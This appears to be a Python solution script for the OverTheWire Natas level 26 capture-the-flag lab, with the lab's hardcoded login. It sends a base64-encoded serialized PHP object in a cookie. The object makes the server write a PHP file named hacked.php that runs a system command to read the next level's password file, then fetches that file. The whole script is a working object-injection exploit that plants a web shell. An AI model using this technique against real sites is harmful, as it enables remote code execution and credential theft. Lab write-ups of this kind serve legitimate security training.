import requests

def flag(url,username,password):
    payload = """Tzo2OiJMb2dnZXIiOjM6e3M6NzoiaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0j
    CiI7czo3OiJleGl0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyN
    ycpOyA/PiI7czo3OiJsb2dGaWxlIjtzOjM3OiIvdmFyL3d3dy9uYXRhcy9uYXRhczI2L2ltZy9oYWNrZWQucGhwIjt9"""
    session = requests.Session()
    site = session.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    cookie_dict = session.cookies.get_dict()
    cookie_value = cookie_dict['PHPSESSID']
    headers = {
            'Cookie':'PHPSESSID=' + cookie_value + "; drawing=" + payload.replace("\n","")
            }
    session.get(url,auth=(username,password),headers=headers)
    flag = session.get(url + 'img/hacked.php', auth=(username,password),headers=headers)
    print("The flag for natas26 is: " + flag.text[0:32].strip())

if __name__=="__main__":
    url = "http://natas26.natas.labs.overthewire.org/"
    username = "natas26"
    password = "8A506rfIAXbKKk68yJeuTuRq4UfcK70k"
    flag(url,username,password)